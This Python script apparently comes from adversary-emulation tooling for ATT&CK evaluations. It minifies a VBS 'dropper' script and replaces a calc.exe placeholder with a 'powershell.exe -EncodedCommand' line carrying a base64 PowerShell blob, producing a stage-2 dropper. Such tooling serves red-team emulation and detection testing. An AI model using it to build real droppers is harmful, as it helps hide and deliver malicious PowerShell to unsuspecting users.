
import argparse
import logging
import re
import sys
import yaml


def get_configuration(config_file):
    """
    Read YAML configuration file, and return config data as list of key value pairs
    """
    try:
        with open(config_file, "r") as file:
            config = yaml.safe_load(file)
            return config

    except Exception as err:
        logging.error(
            "Failed to read configuration file: {}".format(config_file))
        sys.stderr.write(str(err))
        sys.exit(-1)


def minify_vbs_script(file_path):
    """
    Remove script headers, comments, and white space from PowerShell script.
    This script uses in-text delimiters to know when to start and stop.
    """
    start_delim = "'<Start-ATT&CK-Evals-Delimiter>"
    end_delim = "'<End-ATT&CK-Evals-Delimiter>"
    continue_parsing = False
    regex_line_begins_with_comment = r"^[\s]*\'"
    minified_script = ""

    # read until delimiter
    script = open(file_path)
    for line in script:
        if start_delim in line:
            continue_parsing = True
        elif end_delim in line:
            continue_parsing = False

        # start parsing
        if continue_parsing:

            # ignore commented lines
            if re.match(regex_line_begins_with_comment, line):
                continue

            # ignore blank lines
            if len(line) == 0:
                continue

            # remove white space
            line = line.lstrip()

            minified_script += line

    script.close()
    return minified_script


def insert_powershell_blob(vbs_script, input_file):
    # read PowerShell blob
    base64_encoded_powershell_blob = ""
    with open(input_file, "r") as ps_file:
        base64_encoded_powershell_blob = ps_file.read()

    # prepend base64 blob with PowerShell execution command
    stage2_dropper_cmd = "process_to_spawn = \"powershell.exe -EncodedCommand {}\"".format(
        base64_encoded_powershell_blob)
    old_string = "process_to_spawn = \"powershell.exe -c Start-Process calc.exe\""

    # insert stage2 dropper command into VBS script
    vbs_with_powershell_blob = vbs_script.replace(
        old_string, stage2_dropper_cmd)

    return vbs_with_powershell_blob


def main():
    """Program entry point."""

    # handle command line arguments
    parser = argparse.ArgumentParser()
    parser.add_argument("-c", "--conf", required=True,
                        help="Configuration file to read")
    parser.add_argument("-i", "--input", required=True,
                        help="Base64 encoded PowerShell script containing 1 liner to insert in VBS script")
    parser.add_argument("-j", "--vbsfile", required=True,
                        help="Plaintext VBS script to obfuscate")
    parser.add_argument("-o", "--outfile", required=True,
                        help="Output file")
    parser.add_argument("-v", "--verbose", action='count',
                        default=0, help="Print verbose output")
    args = parser.parse_args()

    # parse input and output file arguments
    config_file = args.conf
    output_file = args.outfile
    input_file = args.input
    vbs_file = args.vbsfile

    # handle verbose printing
    if args.verbose:
        logging.basicConfig(
            format="%(levelname)s: %(message)s", level=logging.DEBUG)
    else:
        logging.basicConfig(
            format="%(levelname)s: %(message)s", level=logging.ERROR)

    # read config file
    logging.info("Reading config file: {}".format(config_file))
    config = get_configuration(config_file)

    # minify VBS dropper script
    script_to_minify = vbs_file
    logging.info("Minifying VBS script: {}".format(script_to_minify))

    minified_script = minify_vbs_script(script_to_minify)

    # insert base64 PowerShell blob into script
    configured_vbs_script = insert_powershell_blob(minified_script, input_file)

    # write configured_vbs_script to file
    with open(output_file, "w") as file:
        file.write(configured_vbs_script)

    return


if __name__ == "__main__":
    main()
